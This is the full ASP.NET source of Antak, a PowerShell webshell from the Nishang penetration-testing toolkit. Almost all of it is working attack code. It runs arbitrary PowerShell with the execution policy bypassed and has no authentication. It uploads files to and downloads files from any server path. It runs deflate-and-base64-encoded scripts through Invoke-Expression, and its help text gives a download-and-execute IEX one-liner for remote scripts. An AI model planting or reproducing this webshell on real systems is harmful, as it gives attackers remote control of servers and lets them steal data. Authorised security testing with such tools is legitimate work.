<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>

<%--Antak - A Webshell which utilizes powershell.--%>

<script Language="c#" runat="server">
protected override void OnInit(EventArgs e)
{
    output.Text = @"Welcome to Antak - A Webshell in Powershell
Use help for more details.
Use clear to clear the screen.";
}
string do_ps(string arg)
{
    //This section based on cmdasp webshell by http://michaeldaw.org
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "powershell.exe";
    psi.Arguments = "-noninteractive " + "-executionpolicy bypass " + arg;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();
    return s;
}

void ps(object sender, System.EventArgs e)
{
    string option = console.Text.ToLower();
    if (option.Equals("help"))
    {
        output.Text = @"Use this shell as a normal powershell console. Each command is executed in a new process, keep this in mind
while using commands (like changing current directory or running session aware scripts). 

Executing PowerShell scripts on the target - 
1. Paste the script in command textbox and click 'Encode and Execute'. A reasonably large script could be executed using this.

2. Use powershell one-liner (example below) for download & execute in the command box.
IEX ((New-Object Net.WebClient).DownloadString('URL to script here')); [Arguments here]

3. By uploading the script to the target and executing it.

4. Make the script a semi-colon separated one-liner.


Files can be uploaded and downloaded using the respective buttons.

Uploading a file - 
To upload a file you must mention the actual path on server (with write permissions) in command textbox. 
(OS temporary directory like C:\Windows\Temp may be writable.)
Then use Browse and Upload buttons to upload file to that path.

Downloading a file - 
To download a file enter the actual path on the server in command textbox.
Then click on Download button.

Antak is a part of Nishang and updates could be found here:
https://github.com/samratashok/nishang
A detailed blog post on Antak could be found here
http://www.labofapenetrationtester.com/2014/06/introducing-antak.html

";
        console.Text = string.Empty;
        console.Focus();
    }

    else if (option.Equals("clear"))
    {
        output.Text = string.Empty;
        console.Text = string.Empty;
        console.Focus();
    }
    else
    {
        output.Text += "\nPS> " + console.Text + "\n" + do_ps(console.Text);
        console.Text = string.Empty;
        console.Focus();
    }

}

void execcommand(string cmd)
{
    output.Text += "PS> " + "\n" + do_ps(cmd);
    console.Text = string.Empty;
    console.Focus();
}

void base64encode(object sender, System.EventArgs e)
{
// Compression and encoding directly stolen from Compress-PostScript by Carlos Perez
//http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
    
    string contents = console.Text;
    // Compress Script


    MemoryStream ms = new MemoryStream();

    DeflateStream cs = new DeflateStream(ms, CompressionMode.Compress);

    StreamWriter sw = new StreamWriter(cs, ASCIIEncoding.ASCII);

    sw.WriteLine(contents);

    sw.Close();

    string code = Convert.ToBase64String(ms.ToArray());

    string command = "Invoke-Expression $(New-Object IO.StreamReader (" +

    "$(New-Object IO.Compression.DeflateStream (" +

    "$(New-Object IO.MemoryStream (," +

    "$([Convert]::FromBase64String('" + code + "')))), " +

    "[IO.Compression.CompressionMode]::Decompress))," +

    " [Text.Encoding]::ASCII)).ReadToEnd();";

    execcommand(command);


}
protected void uploadbutton_Click(object sender, EventArgs e)
{
    if (upload.HasFile)
    {
        try
        {
            string filename = Path.GetFileName(upload.FileName);
            upload.SaveAs(console.Text + "\\" + filename);
            output.Text = "File uploaded to: " + console.Text + "\\" + filename;
        }
        catch (Exception ex)
        {
            output.Text = "Upload status: The file could not be uploaded. The following error occured: " + ex.Message;
        }
    }
}

protected void downloadbutton_Click(object sender, EventArgs e)
{
    try
    {
        Response.ContentType = "application/octet-stream";

        Response.AppendHeader("Content-Disposition", "attachment; filename=" + console.Text);

        Response.TransmitFile(console.Text);

        Response.End();

    }

        
        catch (Exception ex)
        {
            output.Text = ex.ToString();
        }
}


</script>
<HTML>
<HEAD>
<title>Antak Webshell</title>
</HEAD> 
<body bgcolor="#808080">
<div>
<form id="Form1" method="post" runat="server" style="background-color: #808080">
    <div style="text-align:center; resize:vertical">
    <asp:TextBox ID="output" runat="server" TextMode="MultiLine" BackColor="#012456" ForeColor="White" style="height: 526px; width: 891px;" ReadOnly="True"></asp:TextBox>
    <asp:TextBox ID="console" runat="server" BackColor="#012456" ForeColor="Yellow" Width="891px" TextMode="MultiLine" Rows="1" onkeydown="if(event.keyCode == 13) document.getElementById('cmd').click()" Height="23px" AutoCompleteType="None"></asp:TextBox>
    

    </div>
    <div style="width: 1100px; text-align:center">
        <asp:Button ID="cmd" runat="server" Text="Submit" OnClick="ps" />
        <asp:FileUpload ID="upload" runat="server"/>
        <asp:Button ID="uploadbutton" runat="server" Text="Upload the File" OnClick="uploadbutton_Click" />
        <asp:Button ID="encode" runat="server" Text="Encode and Execute" OnClick="base64encode" />
        <asp:Button ID="downloadbutton" runat="server" Text="Download" OnClick="downloadbutton_Click" />
    </div>
    
    </form>



 </div>
</body>
</HTML>